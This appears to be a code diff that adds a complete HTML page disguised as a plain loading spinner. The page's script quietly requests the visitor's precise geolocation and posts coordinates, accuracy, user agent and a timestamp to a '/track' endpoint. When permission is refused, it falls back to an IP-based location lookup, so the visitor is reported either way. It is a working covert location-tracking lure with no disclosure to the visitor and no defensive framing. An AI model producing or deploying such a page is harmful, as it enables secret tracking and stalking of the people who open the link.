@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: sans-serif;
+      background: #0f0f0f;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .box { text-align: center; }
+    .spinner {
+      width: 48px; height: 48px;
+      border: 4px solid #222;
+      border-top: 4px solid #00aaff;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    p { color: #888; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner"></div>
+    <p>Loading, please wait...</p>
+  </div>
+  <script>
+    function send(lat, lon, acc) {
+      fetch('/track', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          accuracy: acc,
+          userAgent: navigator.userAgent,
+          timestamp: Date.now()
+        })
+      }).catch(() => {});
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+        () => {
+          fetch('https://ipapi.co/json/')
+            .then(r => r.json())
+            .then(d => send(d.latitude, d.longitude, 5000))
+            .catch(() => {});
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    } else {
+      fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .then(d => send(d.latitude, d.longitude, 5000))
+        .catch(() => {});
+    }
+  </script>
+</body>
+</html>
